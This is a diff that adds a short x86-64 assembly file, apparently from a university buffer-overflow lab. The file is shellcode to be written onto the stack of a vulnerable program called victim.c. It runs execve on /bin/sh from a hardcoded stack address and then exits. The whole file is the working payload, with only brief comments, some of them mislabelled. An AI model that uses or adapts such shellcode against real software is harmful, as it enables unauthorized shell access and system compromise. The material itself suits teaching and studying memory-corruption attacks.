@@ -1,0 +1,26 @@
+/* victim.c */
+/* Author: Zecheng He @ Princeton University */
+/Payload (write to stack) to invoke a shell in victim.c/
+
+#include <sys/syscall.h>
+
+#define file_to_run 0x00007fffffffdf50
+
+.globl main
+        .type   main, @function
+
+main:
+        movq    $file_to_run, %rcx
+        movq    $59, %rax                /* syscall arg 1: syscall number execve(59) */
+        movq    %rcx, %rdi               /* syscall arg 2: string pathname */
+        leaq    8(%rcx), %rsi            /* syscall arg 3: argv ptr to ['/bin/sh']*/
+        movq    $0, %rdx                 /* syscall arg 4: envp (NULL) */
+        syscall                          /* Call execve("/bin/sh", ["/bin/sh"], []) */
+
+        movq    $60, %rax                /* syscall arg 1: SYS_exit (60) */
+        xorq    %rdi,%rdi                /* syscall arg 2: 0 */
+        syscall                          /* invoke syscall */
+
+        .ascii  "/bin/sh\0"
+        .quad   file_to_run              /* Pointer to argv array.*/
+        .quad   0x0
